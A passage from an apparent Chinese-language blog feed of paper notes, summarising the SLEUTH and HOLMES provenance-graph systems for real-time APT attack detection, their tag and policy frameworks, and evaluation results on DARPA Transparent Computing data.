t-tag的subject的操作触发，该操作使一个object可执行。这样的操作会包含chmod和mprotect</li></ul><p><strong>一点优势</strong>：值得注意的是，攻击者的手段并不会因为数据或代码经过了多个中间媒介之后而被“稀释”。啥意思呢？举个栗子：对于不受信任的代码执行策略来说，如果直接从未知网站加载数据的话，当然会触发警报。但是，当这些数据是被下载、提取、解压缩，甚至有可能是编译之后再加载的，在经过了重重转化之后，只要数据被加载，该策略仍然能够被触发。随后再进行回溯分析，就可以找到漏洞利用的第一步。</p><p>（<strong>与其它探测器合作的能力</strong>）另外，其它检测器的输入可以很容易地被集成到SLEUTH中。比如说，某个外部的检测器将一个subject标为可疑，这个时候再SLEUTH中可以将该subject的code t-tag标为unknown，从而后面的分析都会受益。此外该操作也会保留图节点之间的依赖关系。</p><p>被不受信的代码执行所触发的策略，不应该被认为工作在静态环境中（需要动态匹配策略），静态环境意味着不允许新代码产生。实际上，我们期望可以连续地更新和升级，但在企业环境中，我们不希望用户下载未知代码。因此，下面会叙述如何支持<strong>标准化的软件更新机制</strong>。</p><h1 id="5-策略框架"><a class="markdownIt-Anchor" href="#5-策略框架"></a> 5 策略框架</h1><p>本文开发了一个灵活的<strong>策略框架（policy framework）</strong>，用于标签的分配、传播和攻击检测。我们使用<strong>基于规则</strong>的记法来描述策略，例如：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">exec</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>o</mi><mo stretchy="false">)</mo><mo>:</mo><mi>o</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi>t</mi><mi>a</mi><mi>g</mi><mo>&lt;</mo><mi>b</mi><mi>e</mi><mi>n</mi><mi>i</mi><mi>g</mi><mi>n</mi><mo>→</mo><mi>a</mi><mi>l</mi><mi>e</mi><mi>r</mi><mi>t</mi><mo stretchy="false">(</mo><mi mathvariant="normal">&quot;</mi><mi>U</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>E</mi><mi>x</mi><mi>e</mi><mi>c</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\operatorname{exec}(s, o): o.ttag &lt; benign \rightarrow alert (&quot;UntrustedExec&quot;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">e</span><span class="mord mathrm">x</span><span class="mord mathrm">e</span><span class="mord mathrm">c</span></span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">o</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">o</span><span class="mord">.</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">&quot;</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">x</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord">&quot;</span><span class="mclose">)</span></span></span></span></p><p>这条规则被触发的条件是：当一个subject <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">s</span></span></span></span>执行了一个object <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>o</mi></mrow><annotation encoding="application/x-tex">o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">o</span></span></span></span>（比如文件），而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>o</mi></mrow><annotation encoding="application/x-tex">o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">o</span></span></span></span>的t-tag要小于良性。</p><p>在该策略框架中，<strong>规则通常与事件关联</strong>，并且包含objects或subjects的<strong>属性的一些条件</strong>，这些属性包括：</p><ul><li><strong>name</strong>：使用Perl正则表达式来匹配<strong>object name</strong>和<strong>subject命令行</strong></li><li><strong>tags</strong>: 条件中可以放置objects或subjects的t-tags或者c-tags。对于subjects来说，代码和数据的t-tag可以分别使用</li><li><strong>所有权和权限</strong>：条件中可以放置objects和subjects的所有权，或者objects和事件权限</li></ul><p>不同类型的策略有不同的作用：</p><ul><li>检测策略：引发警报</li><li>标签初始化和传播策略：修改标签</li></ul><p>（干嘛的？）<strong>触发点（trigger points）</strong>：为了更好地控制不同类型策略的匹配，我们将策略与触发点联系起来。此外，触发点允许有相似目的的不同事件共享策略。</p><p><img src="https://img-blog.csdnimg.cn/20200212095214302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>上图展示了策略框架中定义的触发点，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>n</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">define</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span></span></span></span>表示一个新的object，比如一个新网络连接的建立、首次提及一个已经存在的文件、新文件的创建等。</p><p>（检测策略匹配过程）当事件出现时，检测策略就会被执行。后面，除非手动配置，否则仅当<strong>目标subject或object</strong>（某个信息流的终点，Target）发生变化时，检测策略才会被再次执行。</p><p>（标签策略）然后，标签策略按照指定的顺序进行尝试，一旦规则匹配，被规则指定的标签将会被分配给<strong>目标事件（Target，也就是subject/object）</strong></p><h2 id="51-标签初始化策略"><a class="markdownIt-Anchor" href="#51-标签初始化策略"></a> 5.1 标签初始化策略</h2><p>该策略被<strong>init trigger</strong>唤醒，然后将初始化标签应用于新的objects，或者早已存在但是在审计数据中第一次提及的objects。回顾一下，当一个subject创建了一个object的时候，默认object会继承该subject的标签，但是用标签初始化策略会将其覆盖。</p><p>仍使用正则表达式来为object定义初始化标签：<br /><img src="https://img-blog.csdnimg.cn/20200212095225885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="52-标签传播策略"><a class="markdownIt-Anchor" href="#52-标签传播策略"></a> 5.2 标签传播策略</h2><p>该策略可以覆盖默认标签。</p><p>该策略还可以防止“过度污染”，例如某应用每次被唤醒的时候，都会读写<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">.</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>h</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">.bash\_history</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord">.</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>文件，但是该操作是正常的，下面的策略对该文件不进行任何操作：</p><p><img src="https://img-blog.csdnimg.cn/20200212100022897.png" alt="" /></p><p>下面的策略将bash读取文件的行为视为加载（load）：</p><p><img src="https://img-blog.csdnimg.cn/20200212100034491.png" alt="" /></p><p>下面的策略对sshd的行为进行任何操作。虽然受信任的服务，比如sshd会与不受信的站点进行交互，但是这些服务被认为可以自我保护，并且仅允许授权用户访问系统，因此这样的服务不应该给他们的数据可信度降级。同样从不受信站点下载的软件安装包或更新包，但是在安装之前会验证受信的软件提供商前面。</p><p><img src="https://img-blog.csdnimg.cn/20200212100055768.png" alt="" /></p><p>另外，当登录阶段完成之后，通常通过执行setuid操作来标识，所以应该为进程分配适当的标签：</p><p><img src="https://img-blog.csdnimg.cn/20200212100624718.png" alt="" /></p><h1 id="6-基于标签的双向分析"><a class="markdownIt-Anchor" href="#6-基于标签的双向分析"></a> 6 基于标签的双向分析</h1><h2 id="61-回溯分析"><a class="markdownIt-Anchor" href="#61-回溯分析"></a> 6.1 回溯分析</h2><p>回溯分析的目标是识别攻击的入口点，入口点是图中入度为0的节点，并且被标记为untrusted。通常是网络连接，但有时也会是其他形式，比如U盘中的文件。</p><p><strong>回溯分析的起点是检测策略产生警报的地方</strong>。每个警报都与一个或多个实体相关，这些实体在图中被标记为可疑节点。反向搜索涉及对图的反向遍历，从而识别由可疑节点连接到入口点的路径。我们注意到，在这样的遍历和接下来的讨论中，依赖关系边的方向是相反的。反向搜索带来了几个重大<strong>挑战</strong>:</p><ul><li><strong>性能</strong>：依赖图可能包含数亿条边。警报数可以达到数千。在这么大的图上执行反向搜索，会消耗大量的计算资源。</li><li><strong>多路径</strong>：通常，从可疑节点向后可访问多个入口点。然而，在APT攻击中，通常只有一个真正的入口点。因此，简单的反向搜索可能会导致大量的误报</li></ul><p>标签可以用来解决这两个挑战。一方面，标签的计算和传播本来就是一种简洁的路径计算。另一方面，如果节点的标签值是unknown，那么该节点很有可能会构成攻击路径。如果节点A的标签是unknown，这意味着至少存在一条路径，从不受信任的入口点指向节点A，这样节点A就比其他拥有良性标签的邻居节点更有可能是攻击的一部分。使用标签来进行反向搜索，消除许多无关节点，极大地减少了搜索空间。</p><p>基于此，我们将反向分析当作<strong>最短路径问题</strong>的一个实例，<strong>标签</strong>被用来定义边的<strong>代价（cost）</strong>。一方面，标签能够“引导”搜索沿着攻击相关的路径，并远离不相关的路径。这使得搜索可以在不必遍历整个图的情况下完成，从而解决了性能方面的挑战。另一方面，最短路径算法通过选择最接近可疑节点的入口点（以路径成本衡量）来解决多个路径的挑战。</p><p>计算最短路径使用<strong>Dijkstra算法</strong>，当入口点被加入到路径中时，算法就停止。</p><p><strong>代价函数设计</strong>：对于那些表示节点依赖关系的<strong>边</strong>，如果其标签是**“未知”<strong>，则为其分配</strong>较低的开销**；其它节点分配较高的开胶，<strong>具体地说：</strong></p><ul><li>从一个“未知”数据/代码 t-tag 的节点，到一个“良性”代码/数据 t-tag 节点的边，为其分配<strong>代价为0</strong></li><li>从一个“良性”代码/数据 t-tag 的节点引出的边，为其分配一个<strong>较高的代价</strong></li><li>从已有“未知” tag 的节点之间引入边，为其分配<strong>代价为1</strong></li></ul><p>与未知 subject/object 直接相关的良性 subject/object 表示图中恶意和良性部分之间的边界。因此，它们必须包含在搜索中，因此这些边的代价是0。</p><p>良性实体之间的信息流动不是攻击的一部分，因此我们将它们的代价设置得非常高，以便将它们排除在搜索之外。</p><p>不可信节点之间的信息流可能是攻击的一部分，因此我们将它们的代价设置为一个较低的值。它们将被包括在搜索结果中，除非由较少边组成的可选路径可用。</p><h2 id="62-前向分析"><a class="markdownIt-Anchor" href="#62-前向分析"></a> 6.2 前向分析</h2><p>前向分析的目的是为了评估攻击的影响。通过从一个入口点开始，发现所有依赖于入口点的可能影响。与反向分析类似，主要的挑战是图的大小。一种简单的方法是，标记<strong>所有</strong>从入口点可到达的 subject/object，这些 subject/object 是通过反向分析得到的。不幸的是，这种方法将导致<strong>影响图</strong>太大。</p><p>在实验中，利用这种方法得到的影响图包含数百万条边，利用我们的简化算法可以降低100到500倍。</p><p>一个降低其大小的方法是使用<strong>距离阈值</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mrow><mi>t</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">d_{t h}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mord mathdefault mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，来排除那些距离可疑节点太远的点，分析人员可以调节该阈值。我们使用在回溯分析时使用到的 cost 。</p><p>（为什么回溯分析不考虑？？）不同于回溯分析的是，我们考虑<strong>机密性</strong>。特别的，一条边两端的节点，一个由<strong>高机密性标签</strong>，另外一个具有<strong>低代码 integrity（可信度？？） 标签</strong>（如未知进程）或者<strong>低数据 integrity 标签</strong>（如未知socket），那么为这条边分配<strong>代价为0</strong>；而当另一个节点由<strong>良性标签</strong>时，为其分配<strong>较高代价值。</strong></p><h1 id="7-实验评估"><a class="markdownIt-Anchor" href="#7-实验评估"></a> 7 实验评估</h1><p>（请求公开源码）</p><h2 id="71-数据集"><a class="markdownIt-Anchor" href="#71-数据集"></a> 7.1 数据集</h2><p><img src="https://img-blog.csdnimg.cn/20200212100637602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>数据集同样来自DARPA TC项目，时间跨度为358小时，包含7300万事件。最后一行是历经3-5天从4台Linux服务器上收集到的良性数据，是本文作者在其实验室中自己生成的。</p><h2 id="72-重建结果"><a class="markdownIt-Anchor" href="#72-重建结果"></a> 7.2 重建结果</h2><p>（1）下图是W-2的攻击场景图：</p><p><img src="https://img-blog.csdnimg.cn/20200212100648331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>（2）下图是F-3的攻击场景图，攻击者使用<strong>窃取的ssh凭证</strong></p><ul><li><strong>scp：secure copy</strong>，用于远程文件拷贝</li></ul><p><img src="https://img-blog.csdnimg.cn/20200212100658575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="73-总体效果"><a class="markdownIt-Anchor" href="#73-总体效果"></a> 7.3 总体效果</h2><p>（1）经典APT攻击阶段汇总</p><p><img src="https://img-blog.csdnimg.cn/20200212100707980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>除了上述阶段，其它比较重要的APT阶段包括<strong>后门植入</strong>、<strong>C&amp;C服务器</strong>、<strong>痕迹清除</strong>（包括攻击过程中投放的可执行文件和创建的文件）和<strong>数据窃取</strong>。</p><p>下图通过计数关键文件、网络连接、攻击涉及的程序数量，将攻击场景重建结果分割：</p><p><img src="https://img-blog.csdnimg.cn/20200212100716259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>其中，入口实体包括入口点以及与入口点进行通信的进程。Exit Points用于逃逸，比如网络套接字。</p><h2 id="74-误报"><a class="markdownIt-Anchor" href="#74-误报"></a> 7.4 误报</h2><p>评估SLEUTH在良性环境下的表现，用到了作者在自己的实验室中生成的良性数据。四台服务器上的数据主要来源于软件的更新和升级：</p><p><img src="https://img-blog.csdnimg.cn/20200212100724654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>正如前面所提到的，策略应该配置为：允许使用企业中批准的标准方法进行软件更新和升级。对于Linux来说，我们有一个策略规则允许这样的操作：当使用apt命令或者unattended-upgrades执行dpkg时。因此，所有10K+的文件下载被标注为良性，而SLEUTH也没有产生警报</p><h2 id="75-运行时间和内存使用"><a class="markdownIt-Anchor" href="#75-运行时间和内存使用"></a> 7.5 运行时间和内存使用</h2><p>测试环境是搭载2.8GHz AMD Opteron 62xx 处理器和48GB主存的Ubuntu 16.04</p><p><img src="https://img-blog.csdnimg.cn/2020021210073572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br />例如L-2，SLEUTH使用了大约329MB内存来存储跨越3.5天所产生的38.5M的事件。在大数据集中，SLEUTH只需要8 bytes内存来存储每个事件；而小数据集中需要20 bytes.（why ？）</p><p>第四行展示了总运行时间，包括<strong>消耗数据集、构建依赖图、检测攻击、重建攻击场景</strong>。由于我们使用了标记，因此分析所需的大部分信息都可以在本地获得。这是我们性能提升的主要原因。</p><p>“Speed-up”一栏说明了SLEUTH的性能优势。它是SLEUTH可以同时处理的数据流的数量，如果CPU的使用是唯一的限制的话。</p><h2 id="76-为数据和代码分别分配标签的好处"><a class="markdownIt-Anchor" href="#76-为数据和代码分别分配标签的好处"></a> 7.6 为数据和代码分别分配标签的好处</h2><p>通过在代码可信度上进行检测和前向分析，可以削减掉大量的警报，极大减小前向分析输出的规模。</p><p>下图展示了使用单个的可信度标签和分离可信度标签（code/data）时，所产生报警数目的不同，注意到在一些情况下，报警数量减少了100-1000倍：</p><p><img src="https://img-blog.csdnimg.cn/20200212100840901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>下图展示了因为标签的分割，前向分析所达到的提升。前向分析的输出被输入到<strong>简化引擎</strong>中，结果如第六行所示；Total列是Split t-tag和SLEUTH Simplification共同作用的结果。</p><p><img src="https://img-blog.csdnimg.cn/20200212100827604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科研 </tag>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaperNote-HOLMES：基于可疑信息流的实时APT检测</title>
      <link href="/2020/02/21/PaperNote-HOLMES%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8F%AF%E7%96%91%E4%BF%A1%E6%81%AF%E6%B5%81%E7%9A%84%E5%AE%9E%E6%97%B6APT%E6%A3%80%E6%B5%8B/"/>
      <url>/2020/02/21/PaperNote-HOLMES%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8F%AF%E7%96%91%E4%BF%A1%E6%81%AF%E6%B5%81%E7%9A%84%E5%AE%9E%E6%97%B6APT%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>原文标题：HOLMES: Real-time APT Detection through Correlation of Suspicious Information Flows</p><p>原文作者：Sadegh M. Milajerdi, Rigel Gjomemo, Birhanu Eshete, R. Sekar, V.N. Venkatakrishnan</p><p>原文来源：S&amp;P2019</p><p>原文链接：<a href="https://arxiv.org/pdf/1810.01594.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1810.01594.pdf</a></p><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>本文构建了一个可以实时检测高级持续性威胁（Advanced Persistent Threat, APT）的系统——HOLMES。该系统可以通过实时汇总攻击者的行为，产生基于杀伤链模型（kill chain）的高级图（high-level graph），实现了将复杂的数据映射为简洁的APT攻击阶段，从而有利于防御者更加直观地发现威胁并进行防御。</p><h2 id="11-杀伤链模型"><a class="markdownIt-Anchor" href="#11-杀伤链模型"></a> 1.1 杀伤链模型</h2><p>杀伤链模型用来描述APT的生命周期，可以让人们更加直观的认识到APT攻击的各个阶段是如何协作配合完成目标的。<br /><img src="https://img-blog.csdnimg.cn/20200115205224917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br />一个典型的APT攻击包含以下阶段：</p><ul><li>Initial Compromise：例如网站挂马或者鱼叉式钓鱼</li><li>Establish Foothold：安装木马后门</li><li>Escalation Privilege：通过漏洞利用</li><li>Internal Reconnaissance：内部侦察目标系统信息</li><li>Move Laterally：横向渗透</li><li>Maintain Presence：Command and Control（C&amp;C）、Remote Access Trojans(RATs)</li><li>Complete Mission：Exfiltration of Confidential Information</li></ul><p>我们注意到，虽然攻击者的手段多种多样，但是映射到高层次的攻击步骤之后，其抽象攻击模式基本不变，基于此可以将复杂的数据映射到具体的攻击阶段。</p><h2 id="12-研究现状"><a class="markdownIt-Anchor" href="#12-研究现状"></a> 1.2 研究现状</h2><p>当前从报警关联（alert correlation）的角度来进行APT入侵检测，使用的大多数都是像Splunk、LogRhythm、IBM QRadar这样的SIEM（Security Information and Event Management  ）系统，从不同的主机上收集日志来关联它们，此类系统存在的问题包括：</p><p>（1）对于从报警到攻击实例之间的复杂关系缺乏可解释性</p><p>（2）将不同主机、时间跨度极长的攻击步骤聚合在一起，精确度不高</p><h2 id="13-本文创新点"><a class="markdownIt-Anchor" href="#13-本文创新点"></a> 1.3 本文创新点</h2><p>（1）能够实时检测系统，产生APT报警</p><p>（2）能够实时产生高级别的攻击图来描述攻击者的行为，协助防御者进行实时地安全响应</p><h2 id="14-解决的主要问题"><a class="markdownIt-Anchor" href="#14-解决的主要问题"></a> 1.4 解决的主要问题</h2><p>HOLMES的要解决的问题是将日志和报警信息映射到杀伤链模型上，提供实时、直观、可视化的攻击场景图，并且能将大量的审计数据抽象为少数的几个攻击节点。</p><p>具体实现上的问题包括：</p><p>（1）如何生成能反映攻击者行为的报警、并降低噪声</p><p>（2）如何有效地进行报警关联</p><p>（3）如何呈现攻击场景</p><h1 id="2-方法提出"><a class="markdownIt-Anchor" href="#2-方法提出"></a> 2 方法提出</h1><p>实现目标是将原始的日志和报警映射到语意上与APT接近的活动步骤<kbd>TTPs(Tactics,Techniques and Procedures)</kbd>，然后再映射到Kill Chain</p><p>（1）系统设计的主要挑战：低级别的审计数据与高级别的kill-chain之间存在巨大的<strong>语意鸿沟</strong>。因此基于<kbd>MITRE’s ATT&amp;CK框架</kbd>构建了一个中间层来缩小语意鸿沟。ATT&amp;CK中以TTPs的方式定义了200多种行为模式，每个TTP定义了一种实现特定高级功能的可能方法。<br /><img src="https://img-blog.csdnimg.cn/20200115205334670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br />（2）为了使低级别的数据有效地映射到TTPs，本文将审计日志表示为<kbd>有向起源图（directed provenance graph）</kbd>，并且使用系统中低级别实体（如文件、进程等）之间的<kbd>信息流（Information Flow）</kbd>作为基础，来进行警报关联.</p><p>（3）为了检测到攻击步骤之间的关联性，本文开发了<kbd>高级别情景图（high-level scenario graph, HSG）</kbd>，HSG的节点对应于TTPs，边表示TTPs实体之间的信息流。在HSG中定义了以下概念：</p><ul><li>Ancestral Cover：描述节点之间的依赖关系</li><li>Noise Reduction：降低与良性活动相关的依赖性</li><li>Ranking and Prioritization：修剪与APT无关的节点和边</li></ul><p>（4）为了减少误报，本文提出的方法是：学习可能会产生误报的良性TTPs模式，采用启发式算法，根据其严重程度为图中的节点和路径分配权重，以便可以对HSG进行排名，并将排名最高的HSG呈现给分析人员。</p><p>（5）评估数据来自DARPA Transparent Computing #3 的Host Audit Data，使用了9个真实的APT场景进行体统评估，并将系统放在真实环境中运行了2周来评估检测效果。</p><h1 id="3-系统设计"><a class="markdownIt-Anchor" href="#3-系统设计"></a> 3 系统设计</h1><p>系统设计的主要任务是建立威胁模型，因此如何建立审计系统以及如何生成日志数据不在本系统设计的范围之内。</p><h2 id="31-数据收集和表示"><a class="markdownIt-Anchor" href="#31-数据收集和表示"></a> 3.1 数据收集和表示</h2><p>该系统使用的审计日志来源于许多主机的不同操作系统：</p><ul><li>Linux auditd</li><li>BSD dtrace</li><li>Windows ETW</li></ul><p>原始数据被收集并处理成与OS无关的格式，输入的**事件（event）**包括：</p><ul><li>principals  ：用户</li><li>files：例如I/O操作、文件创建、文件所有权、权限</li><li>memory：例如mprotect和mmap</li><li>processes：例如进程创建和权限更改</li><li>network connections</li></ul><p>数据以图的形式来表示，我们称之为起源图（provenance graph）。图中的节点包括subjects（processes）和objects（files、pipes、sockets），边表示实体之间的依赖关系。该设计与前人的工作有两个不同之处：</p><p>（1）provenance graph是不断变化的：当一条边改变了节点的依赖关系，一个新的节点将会被创建并替换旧节点。这种“版本化”的方法使得在不改变分析结果的情况下可以对图进行修剪，而且这种versioned graph是无环的，这可以简化许多图算法。</p><p>（2）另一个不同之处是provenance graph是存储在主存中的，每个事件所占空间小于5bytes，这种表示方式可以在较长的时间段内<strong>实时</strong>消耗事件和构建起源图。</p><h2 id="32-ttp规范"><a class="markdownIt-Anchor" href="#32-ttp规范"></a> 3.2 TTP规范</h2><p>TTP规范提供了低级别审计事件和高级别APT步骤之间的映射，因此这是本文所提出的方法的核心。</p><p>TTP代表了具体审计日志和高级APT步骤之间的中间抽象层。我们依靠两种主要技术将审计日志数据提升到该中间层：</p><ul><li>provenance graph</li><li>TTPs实体之间的信息流依赖</li></ul><p>Prerequisites（先决条件）：表现为<strong>因果关系</strong>和和<strong>信息流</strong>的形式。</p><p>为了TTP匹配的效率，不能使用backtracking（回溯）。我们发现，大多数TTP可以在我们的框架中使用单个事件进行建模</p><p><strong>TTP规范举例：</strong><br /><img src="https://img-blog.csdnimg.cn/20200115205401458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>其中，第四列列出了第三列对应的Event Family中所包含的事件；最后一列既可以表示该TTP的先决条件，也可以表示该TTP的先决TTP。先决条件既可以包含于两个TTPs的两个实体之间的关系，而且能够捕获两个TTP拥有一个共同parent的条件。应用先决条件，我们可以减少误报。</p><h2 id="33-hsg构建"><a class="markdownIt-Anchor" href="#33-hsg构建"></a> 3.3 HSG构建</h2><p>图中的椭圆表示匹配的TTPs，椭圆内部是匹配的起源图实体；边表示不同TTPs之间的先决条件。<br /><img src="https://img-blog.csdnimg.cn/20200115205427284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>HSG的构建主要是由先决条件驱动的，如果一个TTP的所有先决条件都满足了，那么这个TTP就会被匹配并且被添加到HSG中。这可以随时减少HSG中TTP的数量，从而可以进行复杂的分析而不会影响实时性能。</p><h2 id="34避免虚假依赖"><a class="markdownIt-Anchor" href="#34避免虚假依赖"></a> 